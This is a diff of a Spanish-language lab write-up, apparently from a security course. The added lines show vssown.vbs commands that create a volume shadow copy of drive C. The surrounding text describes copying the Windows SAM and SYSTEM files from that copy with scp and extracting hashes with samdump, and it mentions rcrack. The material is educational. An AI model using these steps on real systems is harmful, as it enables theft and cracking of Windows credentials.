@@ -76,6 +76,10 @@ rcrack -h hash
 Para poder acceder a dichos archivos introduciremos un script que nos generará una unidad virtual con estos archivos dicho script se llama vssown.vbs.\
 ![Directiva](imgU3/act5script.PNG)
 ![Directiva](imgU3/Act4Pasascript.PNG)
+Para crear dicha copia usaremos la orden 
+cscript.exe vssown.vbs /start para iniciar el script
+cscript.exe vssown.vbs /create c para crear la unidad virtual
+cscript.exe vssown.vbs / list y status para comprobar el estado del script y el numero de unidades virtuales creadas
 -Una vez creada la copia podemos usar la orden scp para copiar desde esta unidad virtual los archivos SAM y SYSTEM a nuestro equipo y unirlas mediante samdump.\
 ![Directiva](imgU3/act4copyfantasma.PNG)
 ![Directiva](imgU3/act4copyfantasma.PNG)
